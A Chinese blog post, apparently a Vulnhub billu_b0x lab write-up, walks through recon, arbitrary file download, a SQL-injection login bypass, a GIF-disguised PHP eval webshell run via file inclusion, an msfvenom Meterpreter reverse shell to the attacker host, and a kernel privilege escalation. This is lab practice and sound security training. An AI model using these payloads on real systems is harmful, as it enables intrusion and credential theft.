@@ -1,0 +1,503 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Vulnhub-billub0x-Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Vulnhub-billub0x-Writeup">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-04-11 20:05" pubdate>
+        2018年4月11日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Vulnhub-billub0x-Writeup</h1>
+            
+            <div class="markdown-body">
+              <p>从表哥那里知道了<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">Vulnhub</a>这个网站，从上面找了个镜像练练手，难度不大，都是些基本的操作，在此记录下。</p>
+<a id="more"></a>
+<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/billu-b0x,188/">镜像下载地址</a></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">his Virtual machine <span class="hljs-keyword">is</span> <span class="hljs-keyword">using</span> ubuntu (<span class="hljs-number">32</span> <span class="hljs-type">bit</span>)<br>Other packages used: -<br>PHP<br>Apache<br>MySQL<br>This virtual machine <span class="hljs-keyword">is</span> <span class="hljs-keyword">having</span> medium difficulty <span class="hljs-keyword">level</span> <span class="hljs-keyword">with</span> tricks.<br>One need <span class="hljs-keyword">to</span> break <span class="hljs-keyword">into</span> VM <span class="hljs-keyword">using</span> web application <span class="hljs-keyword">and</span> <span class="hljs-keyword">from</span> there escalate <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> gain root <span class="hljs-keyword">access</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">any</span> query ping me at https://twitter.com/IndiShell1046<br><br>Enjoy the machine<br></code></pre></td></tr></table></figure>
+<p>最终目标是拿到服务器root权限</p>
+<h2 id="2-渗透测试过程"><a href="#2-渗透测试过程" class="headerlink" title="2. 渗透测试过程"></a>2. 渗透测试过程</h2><p>先简单说一下测试环境的IP</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">攻击机:</span><br><span class="hljs-section">Windows: 192.168.134.1</span><br><span class="hljs-section">Kali: 192.168.134.132</span><br><span class="hljs-section">靶机:</span><br><span class="hljs-section">Ubuntu: 192.168.134.130</span><br></code></pre></td></tr></table></figure>
+<h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><p>首先在Kali上使用Nmap扫描靶机，执行命令：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><br></code></pre></td></tr></table></figure>
+<p>获得结果：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PORT</span>   <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span> <span class="hljs-string">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ssh</span>     <span class="hljs-string">OpenSSH</span> <span class="hljs-number">5.</span><span class="hljs-string">9p1</span> <span class="hljs-string">Debian</span> <span class="hljs-string">5ubuntu1.4</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-string">Linux;</span> <span class="hljs-string">protocol</span> <span class="hljs-number">2.0</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssh-hostkey:</span> <br><span class="hljs-string">|</span>   <span class="hljs-number">1024 </span><span class="hljs-string">fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de</span> <span class="hljs-string">(DSA)</span><br><span class="hljs-string">|</span>   <span class="hljs-number">2048 </span><span class="hljs-number">88</span><span class="hljs-string">:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8</span> <span class="hljs-string">(RSA)</span><br><span class="hljs-string">|_</span>  <span class="hljs-number">256</span> <span class="hljs-string">0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca</span> <span class="hljs-string">(ECDSA)</span><br><span class="hljs-number">80</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>    <span class="hljs-string">Apache</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.2</span><span class="hljs-number">.22</span> <span class="hljs-string">((Ubuntu))</span><br><span class="hljs-string">|</span> <span class="hljs-attr">http-cookie-flags:</span> <br><span class="hljs-string">|</span>   <span class="hljs-string">/:</span> <br><span class="hljs-string">|</span>     <span class="hljs-attr">PHPSESSID:</span> <br><span class="hljs-string">|_</span>      <span class="hljs-string">httponly</span> <span class="hljs-string">flag</span> <span class="hljs-string">not</span> <span class="hljs-string">set</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Apache/2.2.22</span> <span class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">--==[[IndiShell</span> <span class="hljs-string">Lab]]==--</span><br><span class="hljs-attr">MAC Address:</span> <span class="hljs-number">00</span><span class="hljs-string">:0C:29:E7:C7:9A</span> <span class="hljs-string">(VMware)</span><br><span class="hljs-attr">Device type:</span> <span class="hljs-string">general</span> <span class="hljs-string">purpose</span><br><span class="hljs-attr">Running:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">3.</span><span class="hljs-string">X|4.X</span><br><span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:3</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-attr">OS details:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">3.2</span> <span class="hljs-bullet">-</span> <span class="hljs-number">4.8</span><br><span class="hljs-attr">Network Distance:</span> <span class="hljs-number">1</span> <span class="hljs-string">hop</span><br><span class="hljs-attr">Service Info: OS:</span> <span class="hljs-string">Linux;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure>
+<p>我们可以知道，靶机开启了80端口(HTTP)和22端口(SSH)。Web服务器是<code>Apache httpd 2.2.22</code>。<br>直接访问<code>http://192.168.134.130/</code></p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-1.png" srcset="/img/loading.gif"></p>
+<p>先别急着注入，使用Kali下的工具<code>dirb</code>扫一下目录。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure>
+<p>直接上大字典，扫出不少东西。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">---- Scanning URL: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/ ----<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/add (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">307</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/c (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">1</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/cgi-bin/</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">291</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/head (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">2793</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/images/</span><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/<span class="hljs-keyword">in</span> (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">47559</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/index (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">3267</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/panel (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">2469</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/phpmy/</span>    <br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/server-status (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">296</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/show (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">1</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/test (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">72</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/uploaded_images<br></code></pre></td></tr></table></figure>
+<h3 id="2-2-渗透测试"><a href="#2-2-渗透测试" class="headerlink" title="2.2 渗透测试"></a>2.2 渗透测试</h3><p>对收集到的东西进行简单测试。挨个访问一下扫到的目录，暂时找到些有用的：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/add<br>一个图片上传页面。<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/<span class="hljs-keyword">in</span><br>phpinfo()<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/test<br>提示<span class="hljs-string">&quot;&#x27;file&#x27; parameter is empty. Please provide file path in &#x27;file&#x27; parameter&quot;</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/phpmy/</span><br>phpmyadmin<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/index<br>主页<br></code></pre></td></tr></table></figure>
+<p>首先是<code>http://192.168.134.130/test</code>,直接访问显示:</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-2.png" srcset="/img/loading.gif"></p>
+<p>尝试POST一个<code>file=index.php</code>。发现可以下载。<code>file=/etc/passwd</code>也可以下载，存在任意文件下载漏洞。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-3.png" srcset="/img/loading.gif"></p>
+<p>根据之前扫到的目录，可以将源代码全部下载下来：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">add<span class="hljs-selector-class">.php</span> <span class="hljs-keyword">in</span><span class="hljs-selector-class">.php</span> head<span class="hljs-selector-class">.php</span> index<span class="hljs-selector-class">.php</span> panel<span class="hljs-selector-class">.php</span> show<span class="hljs-selector-class">.php</span> test.php<br></code></pre></td></tr></table></figure>
+<p>打开<code>c.php</code>:</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$co</span>nn = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;billu&quot;</span>,<span class="hljs-string">&quot;b0x_billu&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>得到了数据库的账号密码<code>billu:b0x_billu</code>,这样就可以登录<code>phpmyadmin</code>了,由于Mysql权限比较低，不能写shell。但在首页可以知道<code>phpmyadmin</code>的版本是<strong>3.4.7</strong>,尝试在搜索引擎上找漏洞，没啥收获。</p>
+<p>不过查到了<code>phpmyadmin</code>的配置文件中会有服务器的账号密码，借助之前的那个任意文件下载，我们可以获得配置文件<code>config.inc.php</code>。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-4.png" srcset="/img/loading.gif"></p>
+<p>就直接获取了靶机的root的账号密码<code>root:roottoor</code></p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-5.png" srcset="/img/loading.gif"></p>
+<p>再加上靶机开着ssh服务，直接ssh连接登录就行。</p>
+<p>虽然目的达到了，但拿到权限的方法肯定不止这一种，继续寻找。<br>然后我找到了两种登录的方法。<br>一是从<code>phpmyadmin</code>中登录数据库，我们可以在auth表里面获得账号密码</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">uname:</span>biLLu<br><span class="hljs-symbol">pass:</span>hEx_it<br></code></pre></td></tr></table></figure>
+<p>二是从index.php中，我们可以找到实现登录功能的代码：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$uname</span>=str_replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,urldecode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br><span class="hljs-variable">$pass</span>=str_replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,urldecode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br><span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br></code></pre></td></tr></table></figure>
+<p>可以看到进行查询的SQL语句，可以构造<code>un=or 1=1 %23\&amp;ps=or 1=1 %23\</code>来绕过验证，实现登录,或者直接注入出账号密码，两个方式都行。</p>
+<p>对panel.php进行代码审计，发现一个本地文件包含漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>	<span class="hljs-variable">$dir</span>=getcwd();<br>	<span class="hljs-variable">$choice</span>=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>	<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>	&#123;<br>       		<span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>			<span class="hljs-keyword">die</span>();<br>	&#125;<br>	<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>	&#123;<br>        <br>		<span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>		<span class="hljs-keyword">die</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>	&#125;<br>	<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-6.png" srcset="/img/loading.gif"></p>
+<p>接下来找个地方上传一个包含php代码的文件即可。<br>登录之后，在添加用户<code>Add User</code>的地方正好有个上传图片文件的地方。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-7.png" srcset="/img/loading.gif"></p>
+<p>创建一个<code>mengchen.gif</code>文件，内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>直接上传文件，根据<code>panel.php</code>中第76行代码：</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">move_uploaded_file($<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])<br></code></pre></td></tr></table></figure>
+<p>上传的文件在<code>uploaded_images</code>中，直接访问<code>http://192.168.134.130/uploaded_images/</code>就能看到</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-8.png" srcset="/img/loading.gif"></p>
+<p>这样就可以借助本地文件包含漏洞来执行shell了。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-9.png" srcset="/img/loading.gif"></p>
+<p>现在我是<code>www-data</code>权限。但是使用数据包很不方便，使用<code>msfvenom</code>生成一个WebShell：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.134.132 <span class="hljs-attribute">LPORT</span>=23456 -f<span class="hljs-built_in"> raw </span>&gt; mengchen3.php<br></code></pre></td></tr></table></figure>
+<p>然后将WebShell打开，前面加上<code>GIF89a</code>，并且将扩展名改为gif并上传。</p>
+<p>在Kali上,打开<code>metasploit</code>，执行如下命令：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> PAYLOAD php/meterpreter_reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 192.168.134.132 <br><span class="hljs-builtin-name">set</span> LPORT 23456<br>exploit<br></code></pre></td></tr></table></figure>
+<p>然后使用burp发包，执行上传的WebShell。成功的返回了一个<code>Meterpreter</code>。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-10.png" srcset="/img/loading.gif"></p>
+<p>创建一个shell，执行<code>uname -a</code>查看一下内核版本。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-11.png" srcset="/img/loading.gif"></p>
+<p>因为我现在只是<code>www-data</code>用户权限，需要找一下内核漏洞来进行提权。</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation</a></p>
+<p>将代码保存到kali上，<code>exploit.c</code>。接着使用Meterpreter的upload命令，将exp上传到靶机的tmp目录下，使用gcc编译执行，成功获取到了root权限。</p>
+<p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-12.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/18/HITBXCTF2018-Baby-baby-upload/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HITBXCTF2018-Baby baby && upload</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/07/Race-Condition/">
+                        <span class="hidden-mobile">条件竞争（Race Condition）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
